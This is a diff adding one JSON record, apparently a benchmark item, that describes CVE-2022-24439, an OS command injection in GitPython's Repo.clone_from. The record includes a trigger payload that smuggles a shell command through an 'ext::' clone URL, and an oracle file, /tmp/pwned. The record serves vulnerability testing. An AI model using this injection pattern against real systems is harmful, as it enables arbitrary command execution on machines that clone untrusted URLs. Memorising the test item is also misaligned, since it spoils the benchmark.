@@ -1,0 +1,15 @@
+{
+  "file_id": "129_gitpython_issue_1515",
+  "numeric_id": "129",
+  "library_hint": "gitpython",
+  "source": "github_issue",
+  "title": "Remote code execution in GitPython due to unsafe handling of git clone URL protocols",
+  "cve": "CVE-2022-24439",
+  "cwe": "CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
+  "library": "GitPython",
+  "affected_version": "< 3.1.30",
+  "vulnerable_function": "Repo.clone_from",
+  "triggerability": "indirect",
+  "trigger_payload": "Repo.clone_from('ext::sh -c touch /tmp/pwned', '/tmp/clone')",
+  "oracle": "File created at /tmp/pwned"
+}
